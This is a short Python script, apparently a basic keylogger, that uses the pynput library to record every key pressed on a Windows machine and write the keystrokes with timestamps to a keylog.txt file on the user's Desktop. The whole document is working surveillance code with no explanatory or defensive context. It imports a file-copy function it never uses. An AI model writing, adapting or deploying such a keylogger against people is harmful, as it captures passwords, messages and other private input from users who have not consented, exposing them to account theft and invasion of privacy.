from pynput.keyboard import Listener

import os
import logging
from shutil import copyfile

username = os.getlogin()

dir = f"C:/Users/{username}/Desktop"

logging.basicConfig(filename=f"{dir}/keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def keyHandler(key):
    logging.info(key)


with Listener(on_press=keyHandler) as listener:
    listener.join()